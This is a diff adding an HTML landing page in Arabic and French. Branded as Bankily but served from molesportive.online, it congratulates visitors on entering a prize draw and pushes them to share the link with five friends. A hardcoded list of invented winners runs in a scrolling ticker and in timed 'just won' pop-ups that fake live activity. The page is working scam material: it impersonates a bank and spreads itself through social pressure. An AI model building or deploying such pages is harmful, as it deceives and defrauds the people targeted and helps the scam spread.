@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#030E14">
+<title>تم التسجيل – Bankily</title>
+<meta property="og:type"        content="website">
+<meta property="og:url"         content="https://molesportive.online">
+<meta property="og:title"       content="🏆 Bankily – سجّل واربح جوائز استثنائية">
+<meta property="og:description" content="سجّل الآن مجاناً عبر Bankily وادخل سحب الجوائز الكبرى – أيفون، رحلة، منزل ومفاجآت!">
+<meta property="og:image"       content="https://molesportive.online/images/share_banner.jpg">
+<meta name="twitter:card"       content="summary_large_image">
+<meta name="twitter:image"      content="https://molesportive.online/images/share_banner.jpg">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+/* ═══════════════════════════════════════════════
+   BANKILY — Approuv page — same style as index
+═══════════════════════════════════════════════ */
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html,body{overflow-x:hidden;width:100%;background:#030E14}
+body{font-family:'Cairo',sans-serif;background:#030E14;color:#7BBEC8;min-height:100vh}
+
+/* Canvas */
+#cvs{position:fixed;inset:0;z-index:0;pointer-events:none}
+
+/* Toast */
+#toasts{position:fixed;bottom:96px;right:14px;z-index:8000;display:flex;flex-direction:column-reverse;gap:8px;pointer-events:none;max-width:280px}
+html[dir=“rtl”] #toasts{right:auto;left:14px}
+.toast{background:rgba(3,14,20,.95);backdrop-filter:blur(20px);border:1px solid rgba(0,151,167,.25);border-right:3px solid #00B8CC;border-radius:14px;padding:11px 14px;display:flex;align-items:center;gap:11px;box-shadow:0 16px 50px rgba(0,0,0,.8);animation:tIn .4s ease,tOut .4s ease 4.4s forwards}
+html[dir=“rtl”] .toast{border-right:none;border-left:3px solid #00B8CC}
+@keyframes tIn{from{opacity:0;transform:translateX(-28px)}to{opacity:1;transform:none}}
+@keyframes tOut{to{opacity:0;transform:translateX(-28px)}}
+.t-av{width:38px;height:38px;border-radius:50%;flex-shrink:0;background:linear-gradient(135deg,#0097A7,#00C99E);display:flex;align-items:center;justify-content:center;font-size:17px}
+.t-name{font-size:.8rem;font-weight:700;color:#E8F8F8;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.t-val{font-size:.73rem;color:#00B8CC;font-weight:600}
+
+/* Nav */
+nav{position:sticky;top:0;z-index:100;background:rgba(3,13,18,.93);backdrop-filter:blur(30px);border-bottom:1px solid rgba(0,151,167,.18)}
+.nav-in{max-width:1280px;margin:0 auto;padding:.8rem 1.5rem;display:flex;justify-content:space-between;align-items:center}
+.logo{height:40px;display:block}
+.lang-btn{border:1.5px solid #0097A7;border-radius:50px;background:transparent;color:#00B8CC;font-family:‘Cairo’,sans-serif;font-size:.85rem;font-weight:700;padding:.38rem 1.2rem;cursor:pointer;transition:all .3s}
+.lang-btn:hover{background:#0097A7;color:#fff}
+
+/* Layout */
+.wrap{max-width:1280px;margin:0 auto;padding:0 1.5rem}
+.sec{padding:5rem 0;position:relative;z-index:2}
+.sec-head{text-align:center;margin-bottom:3rem}
+.eyebrow{display:inline-flex;align-items:center;gap:.5rem;font-size:.75rem;font-weight:700;letter-spacing:3px;text-transform:uppercase;color:#00B8CC;padding:.35rem 1.1rem;border:1px solid rgba(0,151,167,.25);border-radius:50px;background:rgba(0,151,167,.1);margin-bottom:1rem}
+.eyebrow-dot{width:6px;height:6px;border-radius:50%;background:#00D4E8;box-shadow:0 0 8px #00D4E8}
+.sec-h{font-size:clamp(1.8rem,4vw,2.8rem);font-weight:900;color:#E8F8F8;margin-bottom:.7rem;line-height:1.2}
+.sec-p{color:#3D6E7A;font-size:1rem;max-width:520px;margin:0 auto}
+.sec-line{width:50px;height:3px;margin:1.1rem auto 0;border-radius:2px;background:linear-gradient(90deg,transparent,#0097A7,transparent)}
+.rv{opacity:0;transform:translateY(26px);transition:opacity .75s cubic-bezier(0.23,1,0.32,1),transform .75s cubic-bezier(0.23,1,0.32,1)}
+.rv.v{opacity:1;transform:none}
+
+/* ── SUCCESS HERO ── */
+.success-hero{min-height:60vh;display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden;padding:5rem 0 3rem;z-index:2;text-align:center}
+.hero-orbs{position:absolute;inset:0;pointer-events:none;overflow:hidden}
+.orb{position:absolute;border-radius:50%;filter:blur(90px);animation:orbD 14s ease-in-out infinite}
+.orb1{width:500px;height:500px;top:-150px;right:-120px;background:radial-gradient(ellipse,rgba(0,151,167,.25) 0%,transparent 70%);animation-duration:16s}
+.orb2{width:380px;height:380px;bottom:-100px;left:-80px;background:radial-gradient(ellipse,rgba(0,176,135,.18) 0%,transparent 70%);animation-duration:11s;animation-delay:-6s}
+@keyframes orbD{0%,100%{transform:translate(0,0) scale(1)}33%{transform:translate(18px,-28px) scale(1.05)}66%{transform:translate(-14px,18px) scale(.95)}}
+
+.hero-grid{position:absolute;inset:0;pointer-events:none;background-image:linear-gradient(rgba(0,151,167,.04) 1px,transparent 1px),linear-gradient(90deg,rgba(0,151,167,.04) 1px,transparent 1px);background-size:55px 55px;mask-image:radial-gradient(ellipse 80% 65% at 50% 50%,black 20%,transparent 80%)}
+
+.success-inner{position:relative;z-index:2;max-width:700px;margin:0 auto;padding:0 1.5rem}
+
+.trophy-wrap{font-size:4rem;margin-bottom:1.2rem;animation:trophyBounce 2.5s ease-in-out infinite;filter:drop-shadow(0 10px 25px rgba(252,211,77,.5))}
+@keyframes trophyBounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-16px)}}
+
+.success-badge{display:inline-flex;align-items:center;gap:.6rem;padding:.44rem 1.5rem;margin-bottom:1.5rem;background:linear-gradient(135deg,rgba(0,201,158,.15),rgba(0,151,167,.08));border:1px solid rgba(0,201,158,.4);border-radius:50px;color:#00C99E;font-size:.88rem;font-weight:700;backdrop-filter:blur(10px)}
+
+.success-title{font-size:clamp(2rem,6vw,3.5rem);font-weight:900;line-height:1.1;margin-bottom:1rem;color:#E8F8F8}
+.success-title span{background:linear-gradient(135deg,#00C99E,#00D4E8,#00B8CC);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+
+.success-sub{font-size:clamp(1rem,2vw,1.15rem);color:#7BBEC8;margin-bottom:2.5rem;line-height:1.7}
+
+/* Info bar */
+.info-bar{display:inline-flex;align-items:stretch;background:rgba(8,33,48,.88);backdrop-filter:blur(20px);border:1px solid rgba(0,151,167,.22);border-radius:20px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.7)}
+.ib{padding:1rem 1.5rem;display:flex;flex-direction:column;align-items:center;gap:.3rem}
+.ib+.ib{border-right:1px solid rgba(0,151,167,.2)}
+html[dir=“rtl”] .ib+.ib{border-right:none;border-left:1px solid rgba(0,151,167,.2)}
+.ib-l{font-size:.65rem;color:#3D6E7A;font-weight:700;letter-spacing:1.5px;text-transform:uppercase}
+.ib-v{font-size:1.4rem;font-weight:900;color:#FCD34D;line-height:1}
+.ib-v.sm{font-size:1rem;color:#00B8CC}
+
+/* Back home button */
+.btn-home{display:inline-flex;align-items:center;gap:.6rem;margin-top:2rem;padding:.9rem 2.5rem;border:none;border-radius:50px;background:rgba(0,151,167,.15);border:1.5px solid rgba(0,151,167,.4);color:#00B8CC;font-family:‘Cairo’,sans-serif;font-size:.95rem;font-weight:700;cursor:pointer;text-decoration:none;transition:all .3s}
+.btn-home:hover{background:rgba(0,151,167,.25);border-color:rgba(0,201,158,.6);color:#00C99E}
+
+/* ── SHARE SECTION ── */
+.share-sec{background:linear-gradient(180deg,transparent,rgba(0,151,167,.05),transparent)}
+.share-box{max-width:680px;margin:0 auto;background:rgba(8,33,48,.88);backdrop-filter:blur(20px);border:1px solid rgba(0,151,167,.22);border-radius:24px;padding:2.5rem 2rem;box-shadow:0 20px 60px rgba(0,0,0,.7);position:relative;overflow:hidden}
+.share-box::before{content:’’;position:absolute;top:-1px;left:12%;right:12%;height:1px;background:linear-gradient(90deg,transparent,#00B8CC,transparent)}
+
+.share-preview{background:rgba(3,14,20,.8);border:1px solid rgba(0,151,167,.18);border-radius:16px;overflow:hidden;margin-bottom:1.5rem;cursor:pointer;transition:all .3s}
+.share-preview:hover{border-color:rgba(0,201,158,.45);transform:translateY(-3px);box-shadow:0 10px 30px rgba(0,151,167,.25)}
+.share-preview a{display:block;text-decoration:none}
+.share-preview img{width:100%;height:160px;object-fit:cover;display:block;border-bottom:1px solid rgba(0,151,167,.15)}
+.preview-body{padding:1rem 1.2rem}
+.preview-title{font-size:.92rem;font-weight:700;color:#E8F8F8;margin-bottom:.4rem}
+.preview-text{font-size:.8rem;color:#7BBEC8;line-height:1.5}
+.preview-url{font-size:.72rem;color:#00B8CC;margin-top:.4rem;opacity:.7}
+
+/* Share button */
+.share-btn{width:100%;padding:1rem;border:none;border-radius:50px;background:linear-gradient(135deg,#00C99E,#0097A7);color:#fff;font-family:‘Cairo’,sans-serif;font-size:1.05rem;font-weight:800;cursor:pointer;position:relative;overflow:hidden;box-shadow:0 8px 30px rgba(0,151,167,.5);animation:sbP 2.5s ease-in-out infinite;transition:transform .25s}
+.share-btn::after{content:’’;position:absolute;top:-50%;left:-60%;width:220%;height:220%;background:linear-gradient(45deg,transparent 30%,rgba(255,255,255,.2) 50%,transparent 70%);animation:shimmer 3.5s infinite}
+@keyframes sbP{0%,100%{box-shadow:0 8px 28px rgba(0,151,167,.45),0 0 0 0 rgba(0,151,167,0)}50%{box-shadow:0 14px 45px rgba(0,201,158,.65),0 0 0 12px rgba(0,151,167,.1)}}
+@keyframes shimmer{0%{transform:translateX(-100%) rotate(45deg)}100%{transform:translateX(120%) rotate(45deg)}}
+.share-btn:hover{transform:translateY(-3px);animation:none;box-shadow:0 16px 50px rgba(0,201,158,.7)}
+
+/* Progress dots */
+.share-progress{margin-top:1.4rem;background:rgba(0,151,167,.08);border:1px solid rgba(0,151,167,.18);border-radius:14px;padding:1rem 1.2rem}
+.progress-lbl{font-size:.82rem;color:#7BBEC8;margin-bottom:.8rem;font-weight:600}
+.dots-row{display:flex;justify-content:center;gap:.7rem}
+.dot{width:32px;height:32px;border-radius:50%;background:rgba(255,255,255,.06);border:2px solid rgba(0,151,167,.3);transition:all .4s}
+.dot.done{background:linear-gradient(135deg,#00C99E,#0097A7);border-color:#00C99E;box-shadow:0 0 14px rgba(0,201,158,.6)}
+
+/* Note */
+.share-note{font-size:.82rem;color:#3D6E7A;margin-top:1rem;padding:.9rem 1rem;background:rgba(0,151,167,.06);border-radius:10px;border-right:3px solid #0097A7;line-height:1.6;text-align:right}
+html[dir=“ltr”] .share-note{border-right:none;border-left:3px solid #0097A7;text-align:left}
+
+/* Toast notification */
+.copy-toast{position:fixed;top:-80px;left:50%;transform:translateX(-50%);background:linear-gradient(135deg,#00C99E,#0097A7);color:#fff;padding:.8rem 1.8rem;border-radius:50px;font-weight:700;font-family:‘Cairo’,sans-serif;font-size:.9rem;z-index:9999;transition:top .4s cubic-bezier(0.23,1,0.32,1);white-space:nowrap;box-shadow:0 8px 25px rgba(0,151,167,.5)}
+.copy-toast.show{top:70px}
+
+/* Winners section */
+.ticker-rail{overflow:hidden;border-radius:14px;background:#082130;border:1px solid rgba(0,151,167,.2);margin-bottom:2rem}
+.ticker-tr{display:flex;gap:3rem;white-space:nowrap;padding:.85rem 1rem;animation:tickS 36s linear infinite}
+.ticker-tr:hover{animation-play-state:paused}
+@keyframes tickS{0%{transform:translateX(0)}100%{transform:translateX(-50%)}}
+.ti{display:inline-flex;align-items:center;gap:.65rem;flex-shrink:0}
+.ti-i{color:#F59E0B}.ti-n{font-weight:700;color:#E8F8F8}.ti-sep{color:#3D6E7A}.ti-v{color:#00B8CC;font-weight:700}
+
+/* Footer */
+footer{position:relative;z-index:2;margin-top:4rem;padding:2.5rem 1.5rem 2rem;background:#05141C;border-top:1px solid rgba(0,151,167,.18);text-align:center}
+.ft-glow{position:absolute;top:-1px;left:15%;right:15%;height:1px;background:linear-gradient(90deg,transparent,#0097A7,transparent)}
+footer img{height:34px;opacity:.75;margin-bottom:.8rem;display:block;margin-left:auto;margin-right:auto}
+footer p{color:#3D6E7A;font-size:.82rem}
+</style>
+
+</head>
+<body>
+
+<canvas id="cvs"></canvas>
+
+<div id="toasts"></div>
+<div class="copy-toast" id="copy-toast">✅ تم نسخ الرابط!</div>
+
+<!-- Nav -->
+
+<nav>
+  <div class="nav-in">
+    <img src="images/logo.png" alt="Bankily" class="logo">
+    <button class="lang-btn" onclick="toggleLang()" id="lang-btn">FR</button>
+  </div>
+</nav>
+
+<!-- ══ SUCCESS HERO ══ -->
+
+<section class="success-hero">
+  <div class="hero-orbs"><div class="orb orb1"></div><div class="orb orb2"></div></div>
+  <div class="hero-grid"></div>
+  <div class="success-inner">
+    <div class="trophy-wrap">🏆</div>
+    <div class="success-badge">✅ <span id="badge-txt">تم تسجيلك بنجاح!</span></div>
+    <h1 class="success-title">
+      <span id="title-a">تهانينا!</span><br>
+      <span id="title-b">أنت الآن في سحب الجوائز</span>
+    </h1>
+    <p class="success-sub" id="sub-txt">
+      تم تسجيل مشاركتك في سحب الجوائز الكبرى مع Bankily.<br>
+      شارك الرابط مع 5 أصدقاء لضمان دخولك في السحب!
+    </p>
+    <div class="info-bar">
+      <div class="ib"><div class="ib-l" id="lbl1">الجائزة الكبرى</div><div class="ib-v">250.000 MRU</div></div>
+      <div class="ib"><div class="ib-l" id="lbl2">عدد الجوائز</div><div class="ib-v sm">100+</div></div>
+      <div class="ib"><div class="ib-l" id="lbl3">الفائزون</div><div class="ib-v sm">1500+</div></div>
+    </div>
+    <a href="index.html" class="btn-home" id="btn-home">🏠 <span id="home-lbl">العودة للرئيسية</span></a>
+  </div>
+</section>
+
+<!-- ══ SHARE SECTION ══ -->
+
+<section class="sec share-sec" style="padding:4rem 0">
+  <div class="wrap">
+    <div class="sec-head rv">
+      <div class="eyebrow"><span class="eyebrow-dot"></span><span id="share-eyebrow">مشاركة</span></div>
+      <h2 class="sec-h" id="share-h">شارك مع أصدقائك للفوز</h2>
+      <p class="sec-p" id="share-p">شارك هذا الرابط مع 5 أشخاص على الأقل لضمان دخولك في السحب</p>
+      <div class="sec-line"></div>
+    </div>
+
+```
+<div class="share-box rv">
+  <!-- Preview -->
+  <div class="share-preview" onclick="shareLink()">
+    <a href="https://molesportive.online" target="_blank">
+      <img src="images/share_banner.jpg" alt="Bankily" onerror="this.style.display='none'">
+      <div class="preview-body">
+        <div class="preview-title" id="prev-title">🏆 Bankily – سجّل واربح جوائز استثنائية!</div>
+        <div class="preview-text" id="prev-text">سجّل الآن مجاناً وادخل سحب الجوائز الكبرى — أيفون، رحلة، منزل ومزيد!</div>
+        <div class="preview-url">molesportive.online</div>
+      </div>
+    </a>
+  </div>
+
+  <!-- Share button -->
+  <button class="share-btn" onclick="shareLink()" id="share-btn">
+    📤 <span id="share-btn-txt">مشاركة الرابط</span>
+  </button>
+
+  <!-- Progress -->
+  <div class="share-progress">
+    <div class="progress-lbl" id="progress-lbl">عدد المشاركات: <strong id="share-count">0</strong>/5</div>
+    <div class="dots-row">
+      <div class="dot" id="dot0"></div>
+      <div class="dot" id="dot1"></div>
+      <div class="dot" id="dot2"></div>
+      <div class="dot" id="dot3"></div>
+      <div class="dot" id="dot4"></div>
+    </div>
+  </div>
+
+  <!-- Note -->
+  <div class="share-note" id="share-note">
+    ⭐ شارك هذا الرابط مع 5 أشخاص على الأقل لضمان دخولك في سحب الجوائز الكبرى
+  </div>
+</div>
+```
+
+  </div>
+</section>
+
+<!-- ══ WINNERS TICKER ══ -->
+
+<section class="sec" style="padding:3rem 0">
+  <div class="wrap">
+    <div class="sec-head rv">
+      <div class="eyebrow"><span class="eyebrow-dot"></span><span id="win-eyebrow">الفائزون</span></div>
+      <h2 class="sec-h" id="win-h">الفائزون الأخيرون</h2>
+      <div class="sec-line"></div>
+    </div>
+    <div class="ticker-rail">
+      <div class="ticker-tr" id="ticker"></div>
+    </div>
+  </div>
+</section>
+
+<!-- Footer -->
+
+<footer>
+  <div class="ft-glow"></div>
+  <img src="images/logo.png" alt="Bankily">
+  <p id="footer-txt">جميع الحقوق محفوظة © بنكيلي 2026</p>
+</footer>
+
+<script>
+'use strict';
+
+/* ══════════════════════════════
+   WINNERS DATA
+══════════════════════════════ */
+const WINNERS = [
+  {name:'عمرصلاح الدين',phone:'225***98',amount:'7.100'},{name:'لالا عيشة',phone:'382***87',amount:'1.930'},
+  {name:'مولاي اعلي سالم',phone:'409***70',amount:'1.150'},{name:'رماتا نيانغ',phone:'237***66',amount:'6.500'},
+  {name:'تيجان احمد',phone:'441***06',amount:'1.880'},{name:'مايمونة مخطار',phone:'268***75',amount:'1.400'},
+  {name:'محمد سيسي',phone:'330***16',amount:'2.580'},{name:'فاطمة با',phone:'289***22',amount:'3.200'},
+  {name:'عبد الله ديالو',phone:'441***71',amount:'4.750'},{name:'خديجة اعمرتيشيت',phone:'201***03',amount:'2.100'},
+  {name:'إبراهيم محمد',phone:'345***97',amount:'5.600'},{name:'عائشة سال',phone:'219***81',amount:'1.780'},
+  {name:'يحيى بلال',phone:'272***12',amount:'8.900'},{name:'مريم الشيخ',phone:'298***80',amount:'3.450'},
+  {name:'عثمان با',phone:'205***42',amount:'2.300'},{name:'آمنة جالو',phone:'443***66',amount:'4.200'},
+  {name:'حسن ديوب',phone:'261***92',amount:'12.400'},{name:'زينب فال',phone:'360***00',amount:'3.180'},
+  {name:'أحمد كوني',phone:'341***82',amount:'5.470'},{name:'بنتو سيلا',phone:'461***42',amount:'7.280'},
+];
+
+/* ══════════════════════════════
+   TEXTS
+══════════════════════════════ */
+const T = {
+  ar: {
+    lang:'ar', dir:'rtl', langBtn:'FR',
+    badge:'تم تسجيلك بنجاح! ✅',
+    titleA:'تهانينا!',
+    titleB:'أنت الآن في سحب الجوائز',
+    sub:'تم تسجيل مشاركتك في سحب الجوائز الكبرى مع Bankily.\nشارك الرابط مع 5 أصدقاء لضمان دخولك في السحب!',
+    lbl1:'الجائزة الكبرى', lbl2:'عدد الجوائز', lbl3:'الفائزون',
+    homeBtn:'🏠 العودة للرئيسية',
+    shareEyebrow:'مشاركة',
+    shareH:'شارك مع أصدقائك للفوز',
+    shareP:'شارك هذا الرابط مع 5 أشخاص على الأقل لضمان دخولك في السحب',
+    prevTitle:'🏆 Bankily – سجّل واربح جوائز استثنائية!',
+    prevText:'سجّل الآن مجاناً وادخل سحب الجوائز الكبرى — أيفون، رحلة، منزل ومزيد!',
+    shareBtnTxt:'مشاركة الرابط',
+    progressLbl:'عدد المشاركات:',
+    shareNote:'⭐ شارك هذا الرابط مع 5 أشخاص على الأقل لضمان دخولك في سحب الجوائز الكبرى',
+    shareComplete:'🎉 رائع! اكتملت مشاركاتك. حظاً موفقاً في السحب!',
+    copyToast:'✅ تم نسخ الرابط! شاركه مع أصدقائك',
+    shareText:'🏆 سجّل الآن مجاناً عبر Bankily وادخل سحب الجوائز الكبرى!\n\nجوائز استثنائية: أيفون، رحلة سياحية، منزل ومزيد...\n\nلا تفوّت الفرصة! سجّل مجاناً من هنا 👇',
+    winEyebrow:'الفائزون', winH:'الفائزون الأخيرون',
+    notif:'فاز للتو بـ',
+    footer:'جميع الحقوق محفوظة © بنكيلي 2026',
+  },
+  fr: {
+    lang:'fr', dir:'ltr', langBtn:'عربي',
+    badge:'Inscription réussie! ✅',
+    titleA:'Félicitations!',
+    titleB:'Vous participez au grand tirage',
+    sub:'Votre participation au grand tirage Bankily a été enregistrée.\nPartagez le lien avec 5 amis pour garantir votre entrée!',
+    lbl1:'Grand Prix', lbl2:'Nb. Gagnants', lbl3:'Participants',
+    homeBtn:'🏠 Retour à l\'accueil',
+    shareEyebrow:'Partage',
+    shareH:'Partagez avec vos amis',
+    shareP:'Partagez ce lien avec au moins 5 personnes pour garantir votre participation',
+    prevTitle:'🏆 Bankily – Inscrivez-vous et gagnez!',
+    prevText:'Inscription gratuite et participez au grand tirage – iPhone, Voyage, Maison et plus!',
+    shareBtnTxt:'Partager le lien',
+    progressLbl:'Nombre de partages:',
+    shareNote:'⭐ Partagez ce lien avec au moins 5 personnes pour garantir votre participation au tirage',
+    shareComplete:'🎉 Super! Vos partages sont complets. Bonne chance au tirage!',
+    copyToast:'✅ Lien copié! Partagez-le avec vos amis',
+    shareText:"🏆 Inscrivez-vous gratuitement sur Bankily et participez au grand tirage de prix!\n\nPrix exceptionnels: iPhone, Voyage, Maison et plus...\n\nInscription gratuite ici 👇",
+    winEyebrow:'Gagnants', winH:'Derniers Gagnants',
+    notif:'vient de gagner',
+    footer:'Tous droits réservés © Bankily 2026',
+  }
+};
+
+const SHARE_URL = 'https://molesportive.online';
+
+/* ══════════════════════════════
+   LANG
+══════════════════════════════ */
+let lang = localStorage.getItem('bankily_lang') === 'fr' ? 'fr' : 'ar';
+function L(){ return T[lang]; }
+
+function applyLang(){
+  const t = L();
+  document.documentElement.lang = t.lang;
+  document.body.dir = t.dir;
+  document.getElementById('lang-btn').textContent = t.langBtn;
+  document.getElementById('badge-txt').textContent = t.badge;
+  document.getElementById('title-a').textContent = t.titleA;
+  document.getElementById('title-b').textContent = t.titleB;
+  document.getElementById('sub-txt').textContent = t.sub;
+  document.getElementById('lbl1').textContent = t.lbl1;
+  document.getElementById('lbl2').textContent = t.lbl2;
+  document.getElementById('lbl3').textContent = t.lbl3;
+  document.getElementById('home-lbl').textContent = t.homeBtn.replace('🏠 ','');
+  document.getElementById('btn-home').innerHTML = '🏠 ' + t.homeBtn.replace('🏠 ','');
+  document.getElementById('share-eyebrow').textContent = t.shareEyebrow;
+  document.getElementById('share-h').textContent = t.shareH;
+  document.getElementById('share-p').textContent = t.shareP;
+  document.getElementById('prev-title').textContent = t.prevTitle;
+  document.getElementById('prev-text').textContent = t.prevText;
+  document.getElementById('share-btn-txt').textContent = t.shareBtnTxt;
+  document.getElementById('share-note').textContent = t.shareNote;
+  document.getElementById('win-eyebrow').textContent = t.winEyebrow;
+  document.getElementById('win-h').textContent = t.winH;
+  document.getElementById('footer-txt').textContent = t.footer;
+  document.getElementById('copy-toast').textContent = t.copyToast;
+  updateProgressLabel();
+}
+
+function toggleLang(){
+  lang = lang === 'ar' ? 'fr' : 'ar';
+  localStorage.setItem('bankily_lang', lang);
+  applyLang();
+}
+
+/* ══════════════════════════════
+   SHARE COUNTER
+══════════════════════════════ */
+let shareCount = parseInt(localStorage.getItem('bnk_shares') || '0');
+
+function updateProgressLabel(){
+  document.getElementById('progress-lbl').innerHTML =
+    `${L().progressLbl} <strong id="share-count">${shareCount}</strong>/5`;
+}
+
+function updateDots(){
+  for(let i = 0; i < 5; i++){
+    document.getElementById('dot'+i).classList.toggle('done', i < shareCount);
+  }
+}
+
+updateDots();
+
+function incrementShare(){
+  if(shareCount < 5){
+    shareCount++;
+    localStorage.setItem('bnk_shares', shareCount);
+    updateProgressLabel();
+    updateDots();
+    if(shareCount >= 5) showCopyToast(L().shareComplete);
+  }
+}
+
+/* ══════════════════════════════
+   SHARE LINK
+══════════════════════════════ */
+async function shareLink(){
+  const t = L();
+  const fullText = t.shareText + '\n' + SHARE_URL;
+
+  /* Try Web Share API with image */
+  if(navigator.share){
+    try {
+      const resp = await fetch('images/share_banner.jpg');
+      if(resp.ok){
+        const blob = await resp.blob();
+        const file = new File([blob], 'bankily.jpg', {type:'image/jpeg'});
+        if(navigator.canShare && navigator.canShare({files:[file]})){
+          await navigator.share({title:t.prevTitle, text:t.shareText, url:SHARE_URL, files:[file]});
+          incrementShare(); return;
+        }
+      }
+    } catch(e){}
+
+    try {
+      await navigator.share({title:t.prevTitle, text:t.shareText, url:SHARE_URL});
+      incrementShare(); return;
+    } catch(e){ return; }
+  }
+
+  /* Desktop: copy to clipboard */
+  try {
+    await navigator.clipboard.writeText(fullText);
+  } catch(e){
+    const ta = document.createElement('textarea');
+    ta.value = fullText;
+    ta.style.cssText = 'position:fixed;opacity:0';
+    document.body.appendChild(ta);
+    ta.select(); document.execCommand('copy');
+    document.body.removeChild(ta);
+  }
+  showCopyToast(t.copyToast);
+  incrementShare();
+}
+
+function showCopyToast(msg){
+  const el = document.getElementById('copy-toast');
+  el.textContent = msg;
+  el.classList.add('show');
+  setTimeout(() => el.classList.remove('show'), 3500);
+}
+
+/* ══════════════════════════════
+   TICKER
+══════════════════════════════ */
+function buildTicker(){
+  const ticker = document.getElementById('ticker');
+  let html = '';
+  const all = [...WINNERS, ...WINNERS];
+  all.forEach(w => {
+    html += `<div class="ti"><span class="ti-i">🏆</span><span class="ti-n">${w.name}</span><span class="ti-sep">·</span><span class="ti-v">MRU ${w.amount}</span></div>`;
+  });
+  ticker.innerHTML = html;
+}
+buildTicker();
+
+/* ══════════════════════════════
+   LIVE TOAST NOTIFICATIONS
+══════════════════════════════ */
+const TB = document.getElementById('toasts');
+let ti = Math.floor(Math.random() * WINNERS.length);
+
+function showToast(){
+  const w = WINNERS[ti++ % WINNERS.length];
+  const t = document.createElement('div');
+  t.className = 'toast';
+  t.innerHTML = `<div class="t-av">🎉</div><div><div class="t-name">${w.name}</div><div class="t-val">${L().notif} <strong>MRU ${w.amount}</strong></div></div>`;
+  TB.appendChild(t);
+  setTimeout(() => t.parentNode && t.parentNode.removeChild(t), 5200);
+}
+setTimeout(() => { showToast(); setInterval(showToast, 7000 + Math.random()*4000); }, 5000);
+
+/* ══════════════════════════════
+   INTERSECTION OBSERVER
+══════════════════════════════ */
+new IntersectionObserver(entries => {
+  entries.forEach(en => { if(en.isIntersecting){ en.target.classList.add('v'); } });
+}, {threshold:.15}).observe(...document.querySelectorAll('.rv'));
+
+document.querySelectorAll('.rv').forEach(el => {
+  new IntersectionObserver(entries => {
+    if(entries[0].isIntersecting) el.classList.add('v');
+  }, {threshold:.15}).observe(el);
+});
+
+/* ══════════════════════════════
+   CANVAS PARTICLES
+══════════════════════════════ */
+(function(){
+  const c = document.getElementById('cvs'), ctx = c.getContext('2d');
+  let pts = [], sh = [];
+  const COLS = ['0,212,232','0,201,158','0,184,204'];
+
+  function resize(){
+    c.width = innerWidth; c.height = innerHeight; pts = [];
+    const n = Math.min(80, Math.floor(c.width*c.height/12000));
+    for(let i=0;i<n;i++) pts.push({
+      x:Math.random()*c.width, y:Math.random()*c.height,
+      vx:(Math.random()-.5)*.4, vy:(Math.random()-.5)*.4,
+      r:Math.random()*1.8+.3, a:Math.random()*.6+.15, ci:Math.floor(Math.random()*3)
+    });
+  }
+  function addSh(){sh.push({x:Math.random()*c.width,y:Math.random()*c.height*.3,vx:5+Math.random()*6,vy:2.5+Math.random()*3,a:.9,len:0,maxLen:100+Math.random()*140})}
+  setInterval(addSh, 3800);
+
+  function draw(){
+    ctx.clearRect(0,0,c.width,c.height);
+    pts.forEach(p=>{
+      p.x+=p.vx;p.y+=p.vy;
+      if(p.x<0||p.x>c.width)p.vx*=-1;
+      if(p.y<0||p.y>c.height)p.vy*=-1;
+      ctx.beginPath();ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
+      ctx.fillStyle=`rgba(${COLS[p.ci]},${p.a})`;ctx.fill();
+    });
+    for(let i=0;i<pts.length;i++) for(let j=i+1;j<pts.length;j++){
+      const dx=pts[i].x-pts[j].x,dy=pts[i].y-pts[j].y,d=Math.sqrt(dx*dx+dy*dy);
+      if(d<120){ctx.beginPath();ctx.moveTo(pts[i].x,pts[i].y);ctx.lineTo(pts[j].x,pts[j].y);ctx.strokeStyle=`rgba(0,184,204,${(1-d/120)*.1})`;ctx.lineWidth=.8;ctx.stroke();}
+    }
+    sh=sh.filter(s=>{
+      s.x+=s.vx;s.y+=s.vy;s.len+=Math.hypot(s.vx,s.vy);
+      if(s.len>s.maxLen)s.a-=.06;if(s.a<=0)return false;
+      const g=ctx.createLinearGradient(s.x-s.vx*10,s.y-s.vy*10,s.x,s.y);
+      g.addColorStop(0,'transparent');g.addColorStop(1,`rgba(0,212,232,${s.a})`);
+      ctx.beginPath();ctx.moveTo(s.x-s.vx*10,s.y-s.vy*10);ctx.lineTo(s.x,s.y);
+      ctx.strokeStyle=g;ctx.lineWidth=2;ctx.stroke();return true;
+    });
+    requestAnimationFrame(draw);
+  }
+  window.addEventListener('resize',resize);resize();draw();
+})();
+
+/* Apply lang on load */
+applyLang();
+</script>
+
+</body>
+</html>
